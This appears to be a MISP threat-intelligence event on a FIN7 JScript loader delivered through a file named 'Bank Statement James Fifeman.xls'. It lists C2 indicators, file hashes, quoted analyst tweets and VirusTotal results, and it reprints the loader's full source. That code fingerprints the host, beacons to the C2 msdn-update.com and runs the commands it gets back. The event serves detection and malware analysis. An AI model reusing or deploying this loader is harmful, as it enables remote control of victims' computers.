{"Event": {"date": "2019-05-13", "publish_timestamp": "1563528143", "published": true, "info": "OSINT - [Emering] FIN7 JScript Loader Malware", "threat_level_id": "3", "timestamp": "1563528133", "extends_uuid": "", "uuid": "5cda6599-990c-4803-8c89-45e4950d210f", "analysis": "0", "Orgc": {"uuid": "55f6ea5e-2c60-40e5-964f-47a8950d210f", "name": "CIRCL"}, "Tag": [{"colour": "#0088cc", "name": "misp-galaxy:mitre-enterprise-attack-intrusion-set=\"FIN7\""}, {"colour": "#0088cc", "name": "misp-galaxy:mitre-enterprise-attack-intrusion-set=\"FIN7 - G0046\""}, {"colour": "#0088cc", "name": "misp-galaxy:mitre-intrusion-set=\"FIN7\""}, {"colour": "#0088cc", "name": "misp-galaxy:mitre-intrusion-set=\"FIN7 - G0046\""}, {"colour": "#12e400", "name": "misp-galaxy:threat-actor=\"Anunak\""}, {"colour": "#3b7500", "name": "circl:incident-classification=\"malware\""}, {"colour": "#002642", "name": "osint:source-type=\"microblog-post\""}, {"colour": "#ffffff", "name": "tlp:white"}], "Attribute": [{"to_ids": true, "deleted": false, "value": "msdn-update.com", "uuid": "5cda6ff0-4758-4fe6-a14d-4f4f950d210f", "timestamp": "1557819376", "disable_correlation": false, "comment": "C2", "category": "Network activity", "type": "domain"}, {"to_ids": false, "deleted": false, "value": "// Bank Statement James Fifeman.xls\r\n// C2: hxxps://msdn-update[.]com/\r\n// SHA-256: 1fe27e0a84a5bd2e433360fd2da5b1cad8d142ca2acbf3e256f0c99d99cb57f1\r\n\r\nfunction anonymous() {\r\n    var zbegbiwhuhro = \"&id=\";\r\n    var ihebgysipc = \"fetch\";\r\n    var yfusrihyny = \"\";\r\n    var tindajrurke = \"get_image\";\r\n    var ytysqyprozlibx = \"string\";\r\n    var otocywviso = \"no\";\r\n    var otbybimollu = \"Unknown\";\r\n    var evaritpequx = \"Scripting.FileSystemObject\";\r\n    var yqpawymfikorh = \"_\";\r\n    var koficijojhi = \"/\";\r\n    var inoxhegzajw = \"action=get_command\";\r\n    var ihunuxfip = \"request\";\r\n    var edomsecejso = \"z\";\r\n    var lwilpotasvo = \"create_logo\";\r\n    var vimkiwono = \"string\";\r\n    var pidwagunit = \"%APPDATA%\";\r\n    var gqyxqohoftupi = \"winmgmts:root/CIMV2\";\r\n    var erzirolonje = \"create_image\";\r\n    var esajigfown = \"decrypt\";\r\n    var ewypetevhu = \"?request=page\";\r\n    var bgixmabefzaqnu = \"show_ico\";\r\n    var huzzakrowopvu = \"\";\r\n    var zexygrogy = \"\";\r\n    var iwpodhexzubc = \"images\";\r\n    var bbymyruztovpi = \"WScript.Shell\";\r\n    var xaprislyhbulf = \"show_jpg\";\r\n    var inbypzethezag = \"&\";\r\n    var ucmomadgib = \"request\";\r\n    var vjiwumhojarse = \"group=zsoc._1305&rt=0&secret=fghedf43dsSFvm03&time=120000&uid=\";\r\n    var cedlihrijalti = \"?request=content&id=\";\r\n    var kyppaltuwti = \"image\";\r\n    var ejogamygpu = \"MSXML2.ServerXMLHTTP\";\r\n    var cylofalpitx = \"content\";\r\n    var fifuwacdez = \"encrypt\";\r\n    var atkudecaxme = \"decrypt\";\r\n    var obawufdoxsa = \"\";\r\n    var bhomnismictu = \"encrypt\";\r\n    var ocsekeltan = \"show_png\";\r\n    var vivijsozvali = \"User-Agent\";\r\n    var yracypcamos = \"no\";\r\n    var kexerobi = \"cdn\";\r\n    var inamvagtixjyxj = \"POST\";\r\n    var usubhejreva = \"_\";\r\n    var jaxylibpafl = \"\";\r\n    var hbanamyklujt = \"\";\r\n    var bvaxoqwetmodg = \"agyjabam=\";\r\n    var ditevnaqa = \"https://msdn-update.com/\";\r\n    var wegmexxabha = \"POST\";\r\n    var dnanehmufride = \"encrypt\";\r\n    var fypalygos = \"application/x-www-form-urlencoded\";\r\n    var urmuqizemz = \"Content-Type\";\r\n\r\n    function id() {\r\n        var lrequest = wmi.ExecQuery(\"select * from Win32_NetworkAdapterConfiguration where ipenabled = true\");\r\n        var lItems = new Enumerator(lrequest);\r\n        for (; !lItems.atEnd(); lItems.moveNext()) {\r\n            var mac = lItems.item().macaddress;\r\n            var dns_hostname = lItems.item().DNSHostName;\r\n            if (typeof mac === vimkiwono && mac.length > 1) {\r\n                if (typeof dns_hostname !== vimkiwono && dns_hostname.length < 1) {\r\n                    dns_hostname = otbybimollu;\r\n                } else {\r\n                    for (var i = 0; i < dns_hostname.length; i++) {\r\n                        if (dns_hostname.charAt(i) > edomsecejso) {\r\n                            dns_hostname = dns_hostname.substr(0, i) + yqpawymfikorh + dns_hostname.substr(i + 1);\r\n                        }\r\n                    }\r\n                }\r\n                return mac + yqpawymfikorh + dns_hostname;\r\n            }\r\n        }\r\n    }\r\n\r\n    function crypt_controller(type, request) {\r\n        var encryption_key = obawufdoxsa;\r\n        if (type === esajigfown) {\r\n            request = unescape(request);\r\n            var request_split = request.split(\")*(\");\r\n            request = request_split[0];\r\n            encryption_key = request_split[1].split(obawufdoxsa);\r\n        } else {\r\n            encryption_key = (Math.floor(Math.random() * 9000) + 1000).toString().split(obawufdoxsa);\r\n            request = unescape(encodeURIComponent(request));\r\n        }\r\n        var output = new Array(request.length);\r\n        for (var i = 0; i < request.length; i++) {\r\n            var charCode = request.charCodeAt(i) ^ encryption_key[i % encryption_key.length].charCodeAt(0);\r\n            output[i] = String.fromCharCode(charCode);\r\n        }\r\n        var result_string = output.join(obawufdoxsa);\r\n        if (type === fifuwacdez) {\r\n            result_string = result_string + \")*(\" + encryption_key.join(obawufdoxsa);\r\n            result_string = escape(result_string);\r\n        }\r\n        return result_string;\r\n    }\r\n\r\n    function get_path() {\r\n        var pathes = [iwpodhexzubc, kyppaltuwti, cylofalpitx, ihebgysipc, kexerobi];\r\n        var files = [lwilpotasvo, tindajrurke, erzirolonje, bgixmabefzaqnu, ocsekeltan, xaprislyhbulf];\r\n        var path = pathes[Math.floor(Math.random() * pathes.length)] + koficijojhi + files[Math.floor(Math.random() * files.length)];\r\n        return ditevnaqa + path;\r\n    }\r\n\r\n    function send_data(type, data, crypt) {\r\n        try {\r\n            var http_object = new ActiveXObject(ejogamygpu);\r\n            if (type === ucmomadgib) {\r\n                http_object.open(inamvagtixjyxj, get_path() + ewypetevhu, false);\r\n                data = bvaxoqwetmodg + crypt_controller(fifuwacdez, vjiwumhojarse + uniq_id + zbegbiwhuhro + id() + inbypzethezag + data);\r\n            } else {\r\n                http_object.open(inamvagtixjyxj, get_path() + cedlihrijalti + uniq_id, false);\r\n                if (crypt) {\r\n                    data = crypt_controller(fifuwacdez, data);\r\n                }\r\n            }\r\n            http_object.setRequestHeader(vivijsozvali, \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/50.0\");\r\n            http_object.setRequestHeader(urmuqizemz, fypalygos);\r\n            http_object.setOption(2, 13056);\r\n            http_object.send(data);\r\n            return http_object.responseText;\r\n        } catch (e) {\r\n            return otocywviso;\r\n        }\r\n    }\r\n\r\n    function main() {\r\n        var ncommand = obawufdoxsa;\r\n        ncommand = send_data(ucmomadgib, inoxhegzajw, true);\r\n        if (ncommand !== otocywviso) {\r\n            try {\r\n                eval(crypt_controller(esajigfown, ncommand));\r\n            } catch (e) {}\r\n        }\r\n        var random_knock = 120000 + (Math.floor(Math.random() * 16001) - 5000);\r\n        WScript.Sleep(random_knock);\r\n        main();\r\n    }\r\n    var first = false;\r\n    var shell = new ActiveXObject(bbymyruztovpi);\r\n    var fso = new ActiveXObject(evaritpequx);\r\n    var wmi = GetObject(gqyxqohoftupi);\r\n    var uniq_id = new Date().getUTCMilliseconds();\r\n    var app_path = shell.expandEnvironmentStrings(pidwagunit);\r\n    if (fso.GetFolder(app_path).Type.length > 5) {\r\n        fso.deleteFile(WScript.ScriptFullName);\r\n        try {\r\n            WScript.Sleep(120000);\r\n            main();\r\n        } catch (e) {\r\n            main();\r\n        }\r\n    }\r\n}", "uuid": "5cda7440-6ef4-459c-b3d1-b951950d210f", "timestamp": "1557820480", "disable_correlation": false, "comment": "2019-05-13-FIN7-JS-loader.vk.js", "category": "Other", "type": "other"}, {"to_ids": true, "deleted": false, "value": "https://msdn-update.com/", "uuid": "5cda8135-1174-4cd2-ae6b-456d950d210f", "timestamp": "1557823797", "disable_correlation": false, "comment": "C2", "category": "Network activity", "type": "url"}], "Object": [{"template_version": "5", "deleted": false, "template_uuid": "8ec8c911-ddbe-4f5b-895b-fbff70c42a60", "meta-category": "misc", "comment": "", "sharing_group_id": "0", "distribution": "5", "timestamp": "1557817476", "description": "Microblog post like a Twitter tweet or a post on a Facebook wall.", "uuid": "5cda6884-2c74-4a8c-886d-47e3950d210f", "name": "microblog", "Attribute": [{"to_ids": false, "deleted": false, "value": "2019-05-13: [Emering] #FIN7 JScript Loader #Malware\r\n\u00f0\u0178\u0090\u00b2\r\n\r\nsource: 'Bank Statement James Fifeman.xls'\r\ngroup: 'zsoc._1305' [May 13]\r\n\u00f0\u0178\u203a\u2018\r\nc2: 'msdn-update[.]com'\r\n\u00f0\u0178\u201d\u00a6\r\nMove away from '-cdn' domains \r\n\u00f0\u0178\u00a4\u201d\r\n\r\nh/t @malz_intel\r\n\r\n\u00f0\u0178\u203a\u00a1\u00ef\u00b8\u008f\r\nPushed to their extracted JS loader GitHub -> \r\n(link: https://github.com/k-vitali/Malware-Misc-RE/blob/master/2019-05-13-FIN7-JS-loader.vk.js) github.com/k-vitali/Malwa\u00e2\u20ac\u00a6", "object_relation": "post", "uuid": "5cda6884-fafc-4ff5-86eb-46cc950d210f", "timestamp": "1557817476", "disable_correlation": false, "comment": "", "category": "Other", "type": "text"}, {"to_ids": false, "deleted": false, "value": "Twitter", "object_relation": "type", "uuid": "5cda6884-df40-4d23-bd55-4264950d210f", "timestamp": "1557817476", "disable_correlation": true, "comment": "", "category": "Other", "type": "text"}, {"to_ids": true, "deleted": false, "value": "https://twitter.com/VK_Intel/status/1128079463785349121", "object_relation": "url", "uuid": "5cda6884-8acc-4b2f-8684-49c8950d210f", "timestamp": "1557817476", "disable_correlation": false, "comment": "", "category": "Network activity", "type": "url"}, {"to_ids": false, "deleted": false, "value": "@malz_intel", "object_relation": "username-quoted", "uuid": "5cda6884-c40c-4d40-b736-4967950d210f", "timestamp": "1557817476", "disable_correlation": false, "comment": "", "category": "Other", "type": "text"}, {"to_ids": true, "deleted": false, "value": "https://t.co/BaCFsrePJR?amp=1", "object_relation": "link", "uuid": "5cda6884-cefc-440d-97f9-4714950d210f", "timestamp": "1557817476", "disable_correlation": false, "comment": "", "category": "Network activity", "type": "url"}, {"to_ids": true, "deleted": false, "value": "https://github.com/k-vitali/Malware-Misc-RE/blob/master/2019-05-13-FIN7-JS-loader.vk.js", "object_relation": "link", "uuid": "5cda6884-4d8c-4584-85d0-4a50950d210f", "timestamp": "1557817476", "disable_correlation": false, "comment": "", "category": "Payload delivery", "type": "url"}, {"to_ids": false, "deleted": false, "value": "2019-05-14T01:27:00", "object_relation": "creation-date", "uuid": "5cda6885-34b0-4285-be67-4cb6950d210f", "timestamp": "1557817477", "disable_correlation": false, "comment": "", "category": "Other", "type": "datetime"}, {"to_ids": false, "deleted": false, "value": "VK_Intel", "object_relation": "username", "uuid": "5cda6885-5680-4687-a649-4a84950d210f", "timestamp": "1557817477", "disable_correlation": false, "comment": "", "category": "Other", "type": "text"}]}, {"template_version": "17", "deleted": false, "template_uuid": "688c46fb-5edb-40a3-8273-1af7923e2215", "meta-category": "file", "comment": "", "sharing_group_id": "0", "distribution": "5", "timestamp": "1557819654", "description": "File object describing a file with meta-information", "uuid": "5cda6f37-4d7c-4ad4-9000-6ec3950d210f", "name": "file", "Attribute": [{"to_ids": true, "deleted": false, "value": "Bank Statement James Fifeman.xls", "object_relation": "filename", "uuid": "5cda6f37-eb5c-4ade-b804-6ec3950d210f", "timestamp": "1557819654", "disable_correlation": true, "comment": "", "category": "Payload delivery", "type": "filename"}, {"to_ids": false, "deleted": false, "value": "Malicious", "object_relation": "state", "uuid": "5cda6f37-4910-45f7-ae79-6ec3950d210f", "timestamp": "1557819654", "disable_correlation": true, "comment": "", "category": "Other", "type": "text"}, {"to_ids": true, "deleted": false, "value": "1fe27e0a84a5bd2e433360fd2da5b1cad8d142ca2acbf3e256f0c99d99cb57f1", "object_relation": "sha256", "uuid": "5cda7106-f620-4d93-ae5a-90d9950d210f", "timestamp": "1557819654", "disable_correlation": false, "comment": "", "category": "Payload delivery", "type": "sha256"}]}, {"template_version": "15", "deleted": false, "template_uuid": "688c46fb-5edb-40a3-8273-1af7923e2215", "meta-category": "file", "comment": "", "sharing_group_id": "0", "distribution": "5", "timestamp": "1563528120", "description": "File object describing a file with meta-information", "uuid": "8d2ae1f9-3b21-43e4-aceb-121f903988bc", "name": "file", "ObjectReference": [{"object_uuid": "8d2ae1f9-3b21-43e4-aceb-121f903988bc", "relationship_type": "analysed-with", "referenced_uuid": "72369506-7485-494e-b492-2a31c412cf70", "timestamp": "1557822889", "comment": "", "uuid": "5cda7da9-0520-426f-bf88-4067950d210f"}, {"object_uuid": "8d2ae1f9-3b21-43e4-aceb-121f903988bc", "relationship_type": "analysed-with", "referenced_uuid": "7fc62f80-7bf1-48af-96f6-2c3c99a4536c", "timestamp": "1563528121", "comment": "", "uuid": "5d318bb9-ae80-4282-9aa5-4acf02de0b81"}], "Attribute": [{"to_ids": true, "deleted": false, "value": "b136fed01acf1b7e7e43dfa2db292623", "object_relation": "md5", "uuid": "babbec72-3926-4d8d-8931-a9e3f9965c71", "timestamp": "1557819654", "disable_correlation": false, "comment": "", "category": "Payload delivery", "type": "md5"}, {"to_ids": true, "deleted": false, "value": "d8206bc4bc2efc4062b0f173e8841508c95ed0e4", "object_relation": "sha1", "uuid": "be4cdb98-9ba6-4943-9845-08f7b1ef677a", "timestamp": "1557819654", "disable_correlation": false, "comment": "", "category": "Payload delivery", "type": "sha1"}, {"to_ids": true, "deleted": false, "value": "1fe27e0a84a5bd2e433360fd2da5b1cad8d142ca2acbf3e256f0c99d99cb57f1", "object_relation": "sha256", "uuid": "01abe297-6d6a-442f-9a70-b484f8861e53", "timestamp": "1557819654", "disable_correlation": false, "comment": "", "category": "Payload delivery", "type": "sha256"}]}, {"template_version": "2", "deleted": false, "template_uuid": "d7dd0154-e04f-4c34-a2fb-79f3a3a52aa4", "meta-category": "misc", "comment": "", "sharing_group_id": "0", "distribution": "5", "timestamp": "1557822889", "description": "VirusTotal report", "uuid": "72369506-7485-494e-b492-2a31c412cf70", "name": "virustotal-report", "Attribute": [{"to_ids": false, "deleted": false, "value": "2019-05-14T04:00:38", "object_relation": "last-submission", "uuid": "4ff03189-7f70-4120-9dbf-48339e5c57d0", "timestamp": "1557819654", "disable_correlation": false, "comment": "", "category": "Other", "type": "datetime"}, {"to_ids": false, "deleted": false, "value": "https://www.virustotal.com/file/1fe27e0a84a5bd2e433360fd2da5b1cad8d142ca2acbf3e256f0c99d99cb57f1/analysis/1557806438/", "object_relation": "permalink", "uuid": "521c12c0-2269-4961-8bad-1482e01ee72b", "timestamp": "1557819654", "disable_correlation": false, "comment": "", "category": "Payload delivery", "type": "link"}, {"to_ids": false, "deleted": false, "value": "11/60", "object_relation": "detection-ratio", "uuid": "c267d1a4-d836-4758-91e2-877f5854faf6", "timestamp": "1557819654", "disable_correlation": true, "comment": "", "category": "Payload delivery", "type": "text"}]}, {"template_version": "5", "deleted": false, "template_uuid": "8ec8c911-ddbe-4f5b-895b-fbff70c42a60", "meta-category": "misc", "comment": "", "sharing_group_id": "0", "distribution": "5", "timestamp": "1557835644", "description": "Microblog post like a Twitter tweet or a post on a Facebook wall.", "uuid": "5cdaaf7c-422c-4524-856c-464b950d210f", "name": "microblog", "Attribute": [{"to_ids": false, "deleted": false, "value": "@VK_Intel\r\n Moar #FIN7 (link: https://www.virustotal.com/#/file/1fe27e0a84a5bd2e433360fd2da5b1cad8d142ca2acbf3e256f0c99d99cb57f1/detection) virustotal.com/#/file/1fe27e0\u00e2\u20ac\u00a6\r\nCscript renamed to mswmex57.exe and run from Contacts directory. JavaScript from UserForm1 placed in querlog.txt just like old times. New C2 though: hxxps://msdn-update[.]com/", "object_relation": "post", "uuid": "5cdaaf7d-cca4-49d5-bf6c-4e64950d210f", "timestamp": "1557835645", "disable_correlation": false, "comment": "", "category": "Other", "type": "text"}, {"to_ids": false, "deleted": false, "value": "Twitter", "object_relation": "type", "uuid": "5cdaaf7d-89bc-4f82-9c5f-4295950d210f", "timestamp": "1557835645", "disable_correlation": true, "comment": "", "category": "Other", "type": "text"}, {"to_ids": true, "deleted": false, "value": "https://twitter.com/malz_intel/status/1128058016471719936", "object_relation": "url", "uuid": "5cdaaf7d-5bc8-4555-bfdf-4dc4950d210f", "timestamp": "1557835645", "disable_correlation": false, "comment": "", "category": "Network activity", "type": "url"}, {"to_ids": false, "deleted": false, "value": "@VK_Intel", "object_relation": "username-quoted", "uuid": "5cdaaf7d-d750-4d9d-a9a6-4b4b950d210f", "timestamp": "1557835645", "disable_correlation": false, "comment": "", "category": "Other", "type": "text"}, {"to_ids": false, "deleted": false, "value": "2019-05-14T00:02:00", "object_relation": "creation-date", "uuid": "5cdaaf7d-9734-4341-ae0f-4d72950d210f", "timestamp": "1557835645", "disable_correlation": false, "comment": "", "category": "Other", "type": "datetime"}, {"to_ids": false, "deleted": false, "value": "malz_intel", "object_relation": "username", "uuid": "5cdaaf7d-bb48-4f3f-80bb-48a2950d210f", "timestamp": "1557835645", "disable_correlation": false, "comment": "", "category": "Other", "type": "text"}]}, {"template_version": "2", "deleted": false, "template_uuid": "d7dd0154-e04f-4c34-a2fb-79f3a3a52aa4", "meta-category": "misc", "comment": "", "sharing_group_id": "0", "distribution": "5", "timestamp": "1563528121", "description": "VirusTotal report", "uuid": "7fc62f80-7bf1-48af-96f6-2c3c99a4536c", "name": "virustotal-report", "Attribute": [{"to_ids": false, "deleted": false, "value": "2019-06-12T04:39:43", "object_relation": "last-submission", "uuid": "c1bf4318-12d5-451a-a094-3ecf4f476b2a", "timestamp": "1557819654", "disable_correlation": false, "comment": "", "category": "Other", "type": "datetime"}, {"to_ids": false, "deleted": false, "value": "https://www.virustotal.com/file/1fe27e0a84a5bd2e433360fd2da5b1cad8d142ca2acbf3e256f0c99d99cb57f1/analysis/1560314383/", "object_relation": "permalink", "uuid": "4b41b608-5721-4f9a-8950-7775eefaebce", "timestamp": "1557819654", "disable_correlation": false, "comment": "", "category": "Payload delivery", "type": "link"}, {"to_ids": false, "deleted": false, "value": "30/59", "object_relation": "detection-ratio", "uuid": "de92bfbb-35cc-4731-8327-4be37aa1cbee", "timestamp": "1557819654", "disable_correlation": true, "comment": "", "category": "Payload delivery", "type": "text"}]}]}}